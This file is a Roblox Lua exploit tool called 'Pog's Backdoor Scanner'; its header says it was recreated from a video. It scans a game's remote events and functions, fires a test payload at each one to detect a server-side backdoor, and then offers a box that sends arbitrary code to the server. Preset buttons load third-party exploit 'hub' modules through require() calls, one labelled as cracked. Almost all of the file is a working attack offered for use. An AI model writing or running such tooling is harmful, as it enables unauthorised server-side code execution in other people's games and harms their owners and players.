--[[
		      NOTE:
THIS IS NOT THE ORIGINAL
SCRIPT, SINCE THE ORIGINAL
VERSION IS NOW LOST SCRIPT
MEDIA AND HASN'T BEEN FOUND
AS OF 1/7/2026. THIS GUI
IS BASED OFF OF ONE VIDEO
AND IT MAY NOT BE AS ACURATE
BUT IT'S THE BEST I COULD DO
WITH THE LIMIED FOOTAGE ONLINE.
--]]

local POG = {};

-- StarterGui.Pog's Backdoor Scanner
POG["1"] = Instance.new("ScreenGui",game:GetService("CoreGui"):FindFirstChild("RobloxGui"));
POG["1"]["DisplayOrder"] = 2147483647;
POG["1"]["Name"] = [[Pog's Backdoor Scanner]];
POG["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
POG["1"]["ResetOnSpawn"] = false;


-- StarterGui.Pog's Backdoor Scanner.MainFrame
POG["2"] = Instance.new("Frame", POG["1"]);
POG["2"]["BorderSizePixel"] = 0;
POG["2"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27);
POG["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
POG["2"]["Size"] = UDim2.new(0, 525, 0, 275);
POG["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
POG["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["2"]["Name"] = [[MainFrame]];
POG["2"]["BackgroundTransparency"] = 0.25;


-- StarterGui.Pog's Backdoor Scanner.MainFrame.Border
POG["3"] = Instance.new("UIStroke", POG["2"]);
POG["3"]["Thickness"] = 2;
POG["3"]["Color"] = Color3.fromRGB(255, 255, 255);
POG["3"]["Name"] = [[Border]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.Border.Rainbow
POG["4"] = Instance.new("UIGradient", POG["3"]);
POG["4"]["Name"] = [[Rainbow]];
POG["4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(255, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Pog's Backdoor Scanner.MainFrame.Border.Rainbow.Rotation
POG["5"] = Instance.new("LocalScript", POG["4"]);
POG["5"]["Name"] = [[Rotation]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.Corner
POG["6"] = Instance.new("UICorner", POG["2"]);
POG["6"]["Name"] = [[Corner]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.LoadingFrame
POG["7"] = Instance.new("Frame", POG["2"]);
POG["7"]["Visible"] = false;
POG["7"]["BorderSizePixel"] = 0;
POG["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
POG["7"]["Size"] = UDim2.new(1, 0, 1, 0);
POG["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["7"]["Name"] = [[LoadingFrame]];
POG["7"]["BackgroundTransparency"] = 1;


-- StarterGui.Pog's Backdoor Scanner.MainFrame.LoadingFrame.Title
POG["8"] = Instance.new("TextLabel", POG["7"]);
POG["8"]["TextStrokeTransparency"] = 0;
POG["8"]["BorderSizePixel"] = 0;
POG["8"]["TextSize"] = 30;
POG["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
POG["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
POG["8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
POG["8"]["BackgroundTransparency"] = 1;
POG["8"]["Size"] = UDim2.new(1, 0, 0, 32);
POG["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["8"]["Text"] = [[Pog's Backdoor]];
POG["8"]["Name"] = [[Title]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.LoadingFrame.Description
POG["9"] = Instance.new("TextLabel", POG["7"]);
POG["9"]["TextWrapped"] = true;
POG["9"]["TextStrokeTransparency"] = 0;
POG["9"]["BorderSizePixel"] = 0;
POG["9"]["TextSize"] = 30;
POG["9"]["TextScaled"] = true;
POG["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
POG["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
POG["9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
POG["9"]["BackgroundTransparency"] = 1;
POG["9"]["AnchorPoint"] = Vector2.new(0, 0.5);
POG["9"]["Size"] = UDim2.new(1, 0, 0, 130);
POG["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["9"]["Text"] = [[Checking for backdoors. If your game froze, it's scanning.]];
POG["9"]["Name"] = [[Description]];
POG["9"]["Position"] = UDim2.new(0, 0, 0.5, 0);


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame
POG["a"] = Instance.new("Frame", POG["2"]);
POG["a"]["BorderSizePixel"] = 0;
POG["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
POG["a"]["Size"] = UDim2.new(1, 0, 1, 0);
POG["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["a"]["Name"] = [[ExecutionFrame]];
POG["a"]["BackgroundTransparency"] = 1;


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsButton
POG["b"] = Instance.new("TextButton", POG["a"]);
POG["b"]["TextWrapped"] = true;
POG["b"]["TextStrokeTransparency"] = 0;
POG["b"]["BorderSizePixel"] = 0;
POG["b"]["TextSize"] = 14;
POG["b"]["TextScaled"] = true;
POG["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
POG["b"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27);
POG["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
POG["b"]["BackgroundTransparency"] = 0.25;
POG["b"]["Size"] = UDim2.new(1, 0, 0, 35);
POG["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["b"]["Text"] = [[↓ Scripts ↓]];
POG["b"]["Name"] = [[ScriptsButton]];
POG["b"]["Position"] = UDim2.new(0, 0, 1, 6);


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsButton.Corner
POG["c"] = Instance.new("UICorner", POG["b"]);
POG["c"]["Name"] = [[Corner]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsButton.Border
POG["d"] = Instance.new("UIStroke", POG["b"]);
POG["d"]["Thickness"] = 2;
POG["d"]["Color"] = Color3.fromRGB(255, 255, 255);
POG["d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
POG["d"]["Name"] = [[Border]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsButton.Border.Rainbow
POG["e"] = Instance.new("UIGradient", POG["d"]);
POG["e"]["Name"] = [[Rainbow]];
POG["e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(255, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsButton.Border.Rainbow.Rotation
POG["f"] = Instance.new("LocalScript", POG["e"]);
POG["f"]["Name"] = [[Rotation]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame
POG["10"] = Instance.new("Frame", POG["a"]);
POG["10"]["BorderSizePixel"] = 0;
POG["10"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27);
POG["10"]["Size"] = UDim2.new(1, 0, 0, 215);
POG["10"]["Position"] = UDim2.new(0, 0, 1, 47);
POG["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["10"]["Name"] = [[ScriptsFrame]];
POG["10"]["BackgroundTransparency"] = 0.25;


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.Border
POG["11"] = Instance.new("UIStroke", POG["10"]);
POG["11"]["Thickness"] = 2;
POG["11"]["Color"] = Color3.fromRGB(255, 255, 255);
POG["11"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
POG["11"]["Name"] = [[Border]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.Border.Rainbow
POG["12"] = Instance.new("UIGradient", POG["11"]);
POG["12"]["Name"] = [[Rainbow]];
POG["12"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(255, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.Border.Rainbow.Rotation
POG["13"] = Instance.new("LocalScript", POG["12"]);
POG["13"]["Name"] = [[Rotation]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.Corner
POG["14"] = Instance.new("UICorner", POG["10"]);
POG["14"]["Name"] = [[Corner]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.Polaria
POG["15"] = Instance.new("TextButton", POG["10"]);
POG["15"]["TextWrapped"] = true;
POG["15"]["TextStrokeTransparency"] = 0;
POG["15"]["BorderSizePixel"] = 0;
POG["15"]["TextSize"] = 14;
POG["15"]["TextScaled"] = true;
POG["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
POG["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
POG["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
POG["15"]["BackgroundTransparency"] = 1;
POG["15"]["Size"] = UDim2.new(0, 200, 0, 50);
POG["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["15"]["Text"] = [[Polaria]];
POG["15"]["Name"] = [[Polaria]];
POG["15"]["Position"] = UDim2.new(0, 15, 0, 15);


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.Polaria.Corner
POG["16"] = Instance.new("UICorner", POG["15"]);
POG["16"]["Name"] = [[Corner]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.Polaria.Border
POG["17"] = Instance.new("UIStroke", POG["15"]);
POG["17"]["Transparency"] = 0.9;
POG["17"]["Thickness"] = 2;
POG["17"]["Color"] = Color3.fromRGB(255, 255, 255);
POG["17"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
POG["17"]["Name"] = [[Border]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.ExSer
POG["18"] = Instance.new("TextButton", POG["10"]);
POG["18"]["TextWrapped"] = true;
POG["18"]["TextStrokeTransparency"] = 0;
POG["18"]["BorderSizePixel"] = 0;
POG["18"]["TextSize"] = 14;
POG["18"]["TextScaled"] = true;
POG["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
POG["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
POG["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
POG["18"]["BackgroundTransparency"] = 1;
POG["18"]["Size"] = UDim2.new(0, 200, 0, 50);
POG["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["18"]["Text"] = [[ExSer]];
POG["18"]["Name"] = [[ExSer]];
POG["18"]["Position"] = UDim2.new(0, 235, 0, 15);


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.ExSer.Corner
POG["19"] = Instance.new("UICorner", POG["18"]);
POG["19"]["Name"] = [[Corner]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.ExSer.Border
POG["1a"] = Instance.new("UIStroke", POG["18"]);
POG["1a"]["Transparency"] = 0.9;
POG["1a"]["Thickness"] = 2;
POG["1a"]["Color"] = Color3.fromRGB(255, 255, 255);
POG["1a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
POG["1a"]["Name"] = [[Border]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.KJ
POG["1b"] = Instance.new("TextButton", POG["10"]);
POG["1b"]["TextWrapped"] = true;
POG["1b"]["TextStrokeTransparency"] = 0;
POG["1b"]["BorderSizePixel"] = 0;
POG["1b"]["TextSize"] = 14;
POG["1b"]["TextScaled"] = true;
POG["1b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
POG["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
POG["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
POG["1b"]["BackgroundTransparency"] = 1;
POG["1b"]["Size"] = UDim2.new(0, 200, 0, 50);
POG["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["1b"]["Text"] = [[KJ]];
POG["1b"]["Name"] = [[KJ]];
POG["1b"]["Position"] = UDim2.new(0, 15, 0, 80);


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.KJ.Corner
POG["1c"] = Instance.new("UICorner", POG["1b"]);
POG["1c"]["Name"] = [[Corner]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.KJ.Border
POG["1d"] = Instance.new("UIStroke", POG["1b"]);
POG["1d"]["Transparency"] = 0.9;
POG["1d"]["Thickness"] = 2;
POG["1d"]["Color"] = Color3.fromRGB(255, 255, 255);
POG["1d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
POG["1d"]["Name"] = [[Border]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.Info
POG["1e"] = Instance.new("TextLabel", POG["10"]);
POG["1e"]["TextStrokeTransparency"] = 0;
POG["1e"]["BorderSizePixel"] = 0;
POG["1e"]["TextSize"] = 30;
POG["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
POG["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
POG["1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
POG["1e"]["BackgroundTransparency"] = 1;
POG["1e"]["Size"] = UDim2.new(1, 0, 0, 32);
POG["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["1e"]["Text"] = [[More Scripts Soon...]];
POG["1e"]["Name"] = [[Info]];
POG["1e"]["Position"] = UDim2.new(0, 0, 0, 155);


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.Title
POG["1f"] = Instance.new("TextLabel", POG["a"]);
POG["1f"]["TextStrokeTransparency"] = 0;
POG["1f"]["BorderSizePixel"] = 0;
POG["1f"]["TextSize"] = 30;
POG["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
POG["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
POG["1f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
POG["1f"]["BackgroundTransparency"] = 1;
POG["1f"]["Size"] = UDim2.new(1, 0, 0, 32);
POG["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["1f"]["Text"] = [[Pog's Backdoor]];
POG["1f"]["Name"] = [[Title]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.CodeBox
POG["20"] = Instance.new("TextBox", POG["a"]);
POG["20"]["CursorPosition"] = -1;
POG["20"]["TextStrokeTransparency"] = 0;
POG["20"]["Name"] = [[CodeBox]];
POG["20"]["TextXAlignment"] = Enum.TextXAlignment.Left;
POG["20"]["BorderSizePixel"] = 0;
POG["20"]["TextSize"] = 20;
POG["20"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
POG["20"]["TextYAlignment"] = Enum.TextYAlignment.Top;
POG["20"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
POG["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
POG["20"]["MultiLine"] = true;
POG["20"]["ClearTextOnFocus"] = false;
POG["20"]["PlaceholderText"] = [[Code here...]];
POG["20"]["Size"] = UDim2.new(1, -44, 0, 150);
POG["20"]["Position"] = UDim2.new(0, 22, 0, 40);
POG["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["20"]["Text"] = [[]];
POG["20"]["BackgroundTransparency"] = 1;


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.CodeBox.Corner
POG["21"] = Instance.new("UICorner", POG["20"]);
POG["21"]["Name"] = [[Corner]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.CodeBox.Border
POG["22"] = Instance.new("UIStroke", POG["20"]);
POG["22"]["Transparency"] = 0.9;
POG["22"]["Thickness"] = 2;
POG["22"]["Color"] = Color3.fromRGB(255, 255, 255);
POG["22"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
POG["22"]["Name"] = [[Border]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.Execute
POG["23"] = Instance.new("TextButton", POG["a"]);
POG["23"]["TextWrapped"] = true;
POG["23"]["TextStrokeTransparency"] = 0;
POG["23"]["BorderSizePixel"] = 0;
POG["23"]["TextSize"] = 14;
POG["23"]["TextScaled"] = true;
POG["23"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
POG["23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
POG["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
POG["23"]["BackgroundTransparency"] = 1;
POG["23"]["Size"] = UDim2.new(0, 200, 0, 50);
POG["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["23"]["Text"] = [[Execute]];
POG["23"]["Name"] = [[Execute]];
POG["23"]["Position"] = UDim2.new(0, 42, 0, 210);


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.Execute.Corner
POG["24"] = Instance.new("UICorner", POG["23"]);
POG["24"]["Name"] = [[Corner]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.Execute.Border
POG["25"] = Instance.new("UIStroke", POG["23"]);
POG["25"]["Transparency"] = 0.9;
POG["25"]["Thickness"] = 2;
POG["25"]["Color"] = Color3.fromRGB(255, 255, 255);
POG["25"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
POG["25"]["Name"] = [[Border]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.Clear
POG["26"] = Instance.new("TextButton", POG["a"]);
POG["26"]["TextWrapped"] = true;
POG["26"]["TextStrokeTransparency"] = 0;
POG["26"]["BorderSizePixel"] = 0;
POG["26"]["TextSize"] = 14;
POG["26"]["TextScaled"] = true;
POG["26"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
POG["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
POG["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
POG["26"]["BackgroundTransparency"] = 1;
POG["26"]["Size"] = UDim2.new(0, 200, 0, 50);
POG["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
POG["26"]["Text"] = [[Clear]];
POG["26"]["Name"] = [[Clear]];
POG["26"]["Position"] = UDim2.new(0, 285, 0, 210);


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.Clear.Corner
POG["27"] = Instance.new("UICorner", POG["26"]);
POG["27"]["Name"] = [[Corner]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.Clear.Border
POG["28"] = Instance.new("UIStroke", POG["26"]);
POG["28"]["Transparency"] = 0.9;
POG["28"]["Thickness"] = 2;
POG["28"]["Color"] = Color3.fromRGB(255, 255, 255);
POG["28"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
POG["28"]["Name"] = [[Border]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.Drag
POG["29"] = Instance.new("LocalScript", POG["2"]);
POG["29"]["Name"] = [[Drag]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.Handler
POG["2a"] = Instance.new("LocalScript", POG["2"]);
POG["2a"]["Name"] = [[Handler]];


-- StarterGui.Pog's Backdoor Scanner.MainFrame.Border.Rainbow.Rotation
local function C_5()
local script = POG["5"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_5);
-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsButton.Border.Rainbow.Rotation
local function C_f()
local script = POG["f"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_f);
-- StarterGui.Pog's Backdoor Scanner.MainFrame.ExecutionFrame.ScriptsFrame.Border.Rainbow.Rotation
local function C_13()
local script = POG["13"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_13);
-- StarterGui.Pog's Backdoor Scanner.MainFrame.Drag
local function C_29()
local script = POG["29"];
	local dragging, dragstart, startpos
	script.Parent.InputBegan:Connect(function(input)
		if input.UserInputType.Name == "MouseButton1" or input.UserInputType.Name == "Touch" then
			dragging, dragstart, startpos = true, input.Position, script.Parent.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then dragging = false end
			end)
		end
	end)
	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if dragging and (input.UserInputType.Name == "MouseMovement" or input.UserInputType.Name == "Touch") then
			local delta = input.Position - dragstart
			game:GetService("TweenService"):Create(script.Parent,TweenInfo.new(0,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Position = UDim2.new(startpos.X.Scale, startpos.X.Offset + delta.X, startpos.Y.Scale, startpos.Y.Offset + delta.Y)}):Play()
		end
	end)
end;
task.spawn(C_29);
-- StarterGui.Pog's Backdoor Scanner.MainFrame.Handler
local function C_2a()
local script = POG["2a"];
	local mainframe = script.Parent mainframe.Parent.DisplayOrder = math.huge
	local dragscript = mainframe:FindFirstChild("Drag") dragscript.Enabled = false
	local executionframe = mainframe:FindFirstChild("ExecutionFrame")
	local loadingframe = mainframe:FindFirstChild("LoadingFrame")
	local description = loadingframe:FindFirstChild("Description")
	
	local executebtn = executionframe:FindFirstChild("Execute")
	local clearbtn = executionframe:FindFirstChild("Clear")
	local codebox = executionframe:FindFirstChild("CodeBox")
	local scriptsbtn = executionframe:FindFirstChild("ScriptsButton")
	local scriptsframe = executionframe:FindFirstChild("ScriptsFrame")
	
	local frameopen = false
	local scriptsbtn_opentext = "↓ Scripts ↓"
	local scriptsbtn_closetext = "↑ Scripts ↑"
	local nobackdoor_text = "Sorry! No backdoor was found in this game!"
	
	local backdoored = false
	local vulnremote = nil
	local timeout = 0.28
	local blacklistedstrings = {"CheatDetected", "ExploitDetected","MouseLock","MouseLoc"}
	local susstrings = {"Fire","Loadstring","Run","Code","Execute","Load","Script","RemoteEvent","Inject"}
	local remotes = {}
	local priority = {}
	
	local testpartname = "PogsBackdoor_"..tostring(math.random(10000,99999))
	local payload = [[Instance.new("FluidForceSensor",game:GetService("SoundService")).Name = "]]..testpartname..[["]]
	local cleanup = [[game:GetService("SoundService"):FindFirstChild("]]..testpartname..[["):Destroy()]]
	
	loadingframe.Visible = true
	executionframe.Visible = false
	scriptsbtn.Text = scriptsbtn_opentext
	scriptsframe.Visible = false
	
	local function notify(txt)
		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Pog Backdoor Scanner",
				Text = tostring(txt),
				Duration = 5,
			})
		end)
	end
	
	local function checkremote(remote)
		for _, str in ipairs(blacklistedstrings) do
			if string.find(remote.Name:lower(), str:lower()) then
				return false
			end
		end
		if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" or remote.Name == "CharacterSoundEvent" then
			return false
		end
		if remote.Parent.Parent then
			if remote.Parent.Parent.Name == "HDAdminClient" and remote.Parent.Name == "Signals" then
				return false
			end
			if remote.Parent.Name == "RobloxReplicatedStorage" 
				or remote.Parent.Name == "DefaultChatSystemChatEvents" then
				return false
			end
		end
		return true
	end
	
	local function checkpriority(remote)
		for _, str in ipairs(susstrings) do
			if string.find(remote.Name:lower(), str:lower()) then
				return true
			end
		end
		return false
	end
	
	local function fire(remote,args)
		if remote == nil then return end
		if remote:IsA("RemoteEvent") then
			pcall(function() remote:FireServer(args) end)
		elseif remote:IsA("RemoteFunction") then
			coroutine.wrap(function() return remote:InvokeServer(args) end)()
		end
	end
	
	local function checkpayload(remote)
		fire(remote,payload)
		local start = os.clock()
		while os.clock() - start < timeout do
			if game:GetService("SoundService"):FindFirstChild(testpartname) then
				return true
			end
			task.wait()
		end
		return false
	end
	
	print("Pog's Backdoor || Scanning in progress...")
	
	for _, remote in ipairs(game:GetDescendants()) do
		if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
			if checkremote(remote) then
				if checkpriority(remote) then
					print("Pog's Backdoor || Found possible priority remote: "..remote.Name)
					table.insert(priority,remote)
				else
					print("Pog's Backdoor || Found possible remote: "..remote.Name)
					table.insert(remotes,remote)
				end
			end
		end
	end
	
	print("Pog's Backdoor || Scanning: "..#remotes+#priority.." remotes")
	
	if not backdoored then
		for _, remote in ipairs(priority) do
			print("Pog's Backdoor || Checking priority remote: "..remote.Name)
			if checkpayload(remote) then
				print("Pog's Backdoor || Found backdoor: "..remote.Name)
				backdoored = true
				vulnremote = remote
				break
			end
		end
	end
	
	if not backdoored then
		for _, remote in ipairs(remotes) do
			print("Pog's Backdoor || Checking remote: "..remote.Name)
			if checkpayload(remote) then
				print("Pog's Backdoor || Found backdoor: "..remote.Name)
				backdoored = true
				vulnremote = remote
				break
			end
		end
	end
	
	if backdoored then
		notify("Backdoor found! Backdoor:\n"..vulnremote:GetFullName())
		loadingframe.Visible = false
		executionframe.Visible = true
		dragscript.Enabled = true
	else
		task.spawn(function()
			description.Text = nobackdoor_text
			task.wait(2)
			mainframe.Parent:Destroy()
		end)
	end
	
	executebtn.MouseButton1Click:Connect(function()
		if not backdoored then return end
		fire(vulnremote,codebox.Text)
	end)
	
	clearbtn.MouseButton1Click:Connect(function()
		codebox.Text = ""
	end)
	
	scriptsbtn.MouseButton1Click:Connect(function()
		if not frameopen then
			scriptsbtn.Text = scriptsbtn_closetext
			scriptsframe.Visible = true
		else
			scriptsbtn.Text = scriptsbtn_opentext
			scriptsframe.Visible = false
		end
		frameopen = not frameopen
	end)
	
	scriptsframe.Polaria.MouseButton1Click:Connect(function()
		codebox.Text = [[require(0x5d51b2a9ce4b)["Polaria Hub, reuploaded by C:\Drive"]("]]..game.Players.LocalPlayer.Name..[[")]]
	end)
	scriptsframe.ExSer.MouseButton1Click:Connect(function()
		codebox.Text = [[require(0x308BC2E6B)['ExSer Cracked by LALOL Hub']("]]..game.Players.LocalPlayer.Name..[[")]]
	end)
	scriptsframe.KJ.MouseButton1Click:Connect(function()
		codebox.Text = [[require(89529616632600)("]]..game.Players.LocalPlayer.Name..[[","KJ")]]
	end)
end;
task.spawn(C_2a);

return POG["1"], require;
